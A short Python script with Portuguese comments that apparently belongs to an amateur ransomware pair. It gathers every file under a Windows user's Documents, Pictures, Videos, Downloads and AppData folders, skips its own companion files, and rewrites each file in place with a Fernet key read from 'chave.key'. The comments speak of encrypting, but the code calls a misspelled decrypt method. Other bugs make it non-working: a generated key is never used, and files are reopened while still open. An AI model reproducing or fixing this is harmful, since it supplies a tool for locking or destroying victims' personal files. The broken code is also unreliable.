import os
from cryptography.fernet import Fernet

# cria a chave de criptografia e descriptografia
Key = Fernet.generate_key()
with open("chave.key", "rb") as chave:
    chave_secreta = chave.read()

#lista os arquivos que vão ser criptografados

username = os.getenv("USERNAME")
folders = [
    os.path.join(r"C:\Users", username, "documents"),
    os.path.join(r"C:\Users", username, "Pictures"),
    os.path.join(r"C:\Users", username, "Videos"),
    os.path.join(r"C:\Users", username, "Downloads"),
    os.path.join(r"C:\Users", username, "AppData", "Local"),
    os.path.join(r"C:\Users", username, "AppData", "Roaming")
]
arquivos = []

for folder in folders:
    for root, dirs, files in os.walk(folder):
        for file in files:

            if file in ["toilet.py", "chave.key","skibidi.py", "desktop.ini"]:
                continue
            
            file_path = os.path.join(root, file)
            arquivos.append(file_path)

#criptografat os arquivos
for arquivo in arquivos:
    with open(arquivo, "rb") as file:
        conteudo = file.read()

        conteudo_descriptografado = Fernet(chave_secreta).descrypt(conteudo)

        with open(arquivo, "wb") as file:
            file.write(conteudo_descriptografado)